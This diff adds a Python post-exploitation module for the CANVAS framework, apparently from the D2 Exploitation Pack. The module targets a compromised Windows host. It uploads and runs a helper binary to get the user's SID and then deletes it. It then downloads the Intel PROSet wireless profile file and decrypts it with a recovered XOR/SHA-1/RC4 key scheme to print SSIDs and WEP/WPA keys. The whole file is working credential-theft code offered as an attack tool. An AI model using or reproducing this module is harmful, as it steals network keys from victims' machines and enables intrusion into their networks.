@@ -1,0 +1,243 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+import re
+import sys
+import sha
+import struct
+
+if '.' not in sys.path:
+    sys.path.append('.')
+	
+
+from exploitutils import *
+from canvasexploit import canvasexploit
+from shelllistener import *
+from MOSDEF import mosdef
+import canvasengine
+
+
+# GUI info
+NAME = "Intel PROSet Wireless Configuration Dumper"
+
+DESCRIPTION = "Get Wifi configuration file of Intel PROSet software and decrypt it to get SSID and WEP/WPA keys"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Intel"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+
+VERSION = "1.0"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Commands"
+PROPERTY['ARCH'] = [["Windows"]]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+class theexploit(canvasexploit):
+
+    def __init__(self):
+        canvasexploit.__init__(self)
+        
+        self.name = NAME    
+        self.local_path = os.getcwd() + "\\3rdparty\\D2SEC\\exploits\\d2sec_wifi_intel\\"
+        self.getsid_exe = self.local_path + "getsid.exe"
+        self.profile_name = "Profiles.enc" 
+        
+        return
+
+    def str2hex(self, data):
+        hex = ""
+        
+        for x in data:
+          hex = hex + "\\x%02X" % ord(x)
+        
+        return hex
+  
+    def xor_crypt(self, data, key):
+        idx = 0
+        crypted = "" 
+        
+        for x in range(len(data)):
+          crypted = crypted + chr( ord(data[x]) ^ ord(key[idx]))
+          idx = (idx + 1) % len(key)
+        
+        return crypted
+  
+    def decrypt(self, data, userid, xorkey):
+        # USER_SID XOR USER_NAME = XORED_VALUE
+        xor_data = self.xor_crypt(userid, xorkey)
+        
+        # SHA_1(XORED_VALUE) = HASH_VALUE_1
+        sha1_hash = sha.new(xor_data)
+        hex_hash = sha1_hash.hexdigest()  
+        
+        # SHA_1(HASH_VALUE_1_32) = HASH_VALUE_2
+        hex_hash = hex_hash[:32]
+        sha1_hash_2 = sha.new(hex_hash)
+                 
+        # RC4_KEY == HEX(HASH_VALUE_2_10)
+        key = sha1_hash_2.hexdigest()
+        key = key[:10]
+          
+        if (len(key) % 2) == 0:    
+          rc4_key = key.decode("hex")    
+        else:
+          self.log("Decrypt error")
+        
+        # Decrypt data
+        rc4 = ARC4.new(rc4_key)
+        cleartext = rc4.decrypt(data)
+        
+        return cleartext
+ 
+    def printStr(self, string):
+        tmp = ""
+        
+        for c in string:
+          if  c == "\x00":
+            break
+          tmp += c
+        
+        return tmp.strip()
+  
+    def read_conf(self, data):
+        self.log("\n")
+        self.log("[+] PROFILE\t: %s" % (self.printStr(data[0x4:])))  
+        self.log("[+] SSID\t\t: %s" % (self.printStr(data[0x44:])))
+              
+        param_1 = data[0xA0:0xA1]
+        param_2 = data[0x98:0x99]
+        
+        if param_1 == "\x01":
+          info = "NO SECURITY"  
+        
+        elif param_1 == "\x02":
+          info = "WEP 64 BITS"
+        
+        elif param_1 == "\x03":
+          info = "WEP 128 BITS"
+        
+        elif param_1 == "\x06":
+          info = "TKIP"
+          if param_2 == "\x04":
+            info = "WPA " + info
+          elif param_2 == "\x06":
+            info = "WPA2 " + info
+        
+        elif param_1 == "\x07":
+          info = "AES"  
+          if param_2 == "\x04":
+            info = "WPA " + info
+          elif param_2 == "\x06":
+            info = "WPA2 " + info
+        
+        else:
+          info = "UNKNOWN"
+        
+        self.log("[+] SECURITY\t: %s" % (info))
+        
+        if param_2 == "\x01":    
+          self.log("[+] KEY\t\t: %s" % (self.printStr(data[0xA6:])))
+        elif (param_2 == "\x04") or (param_2 == "\x06"):
+          self.log("[+] KEY\t\t: %s" % (self.printStr(data[0x3BC:])))
+        else:
+          self.log("[+] KEY\t\t: UNKOWN")        
+  
+    def run_attack(self,node):
+        self.node = node
+        
+        # Get user profile path        
+        profile_path = self.node.shell.GetEnvironmentVariable("userprofile")
+        self.log("User profile path: %s" % (profile_path))        
+        
+        # Upload getsid binary
+        self.log("Uploading binary")
+        remote_path = self.node.shell.getcwd() + "\\"        
+        getsid_exe = remote_path + "getsid.exe"
+        ret = self.node.shell.upload(self.getsid_exe, destfilename=getsid_exe)
+        
+        if not ret:
+            self.log("Upload failed")
+            return 0
+        
+        # Run getsid binary        
+        ret = self.node.shell.runcommand(getsid_exe)
+        (username, usersid) = ret.split("|")
+        
+        if ret.count("Error") > 0:
+            self.log("Run binary failed")
+            return 1                    
+
+        # Delete uploaded file                        
+        self.log("Removing uploaded file")
+        self.node.shell.unlink(getsid_exe)        
+
+        # Download encrypted profile file
+        self.log("Download Intel profile file")                
+        ret = self.node.shell.download(profile_path + "\\Application Data\\Intel\\Wireless\\WLANProfiles\\" + self.profile_name, self.local_path + self.profile_name)
+        
+        if not ret:
+            self.log('Download failed.')
+            return 0
+                
+        # Open encrypted profiles file
+        f = open(self.local_path + self.profile_name, mode="rb")
+        data = f.read()
+        f.close()
+        
+        # Decrypt file
+        xorkey = username.lower() + "\x00"
+        
+        p = re.compile('\x4c\x0e\x00\x00')					
+        m = p.finditer(data)
+				
+        for match in m:
+        	idx = match.end()
+        	val = ord(struct.unpack("c", data[idx:idx+1])[0])
+					
+        	if not (val == 1):										      
+        		# Decrypt profile 
+        		cleartext = self.decrypt(data[idx:idx+3660], usersid, xorkey)
+		                    
+        		# Display Wifi configuration information
+        		self.read_conf(cleartext)
+        
+        return 0
+
+    def run(self):
+        try:
+        	from Crypto.Cipher import ARC4
+        except:
+        	self.log("Error: you need pycrypto to use this exploit")	
+        	return 0
+
+        self.setInfo("%s (in progress)" % (NAME))
+        success = 0 
+        
+        for node in self.argsDict["passednodes"]:
+            if "win32api" not in node.capabilities:
+                self.log("Node %s not a Win32 node" % (node.getname()))
+                continue
+                
+            ret = self.run_attack(node)
+            
+            if ret == 1:
+                success = 1
+                
+        return success
+
+if __name__=='__main__':
+    print 'This win32 local module is meant to be run only within CANVAS'
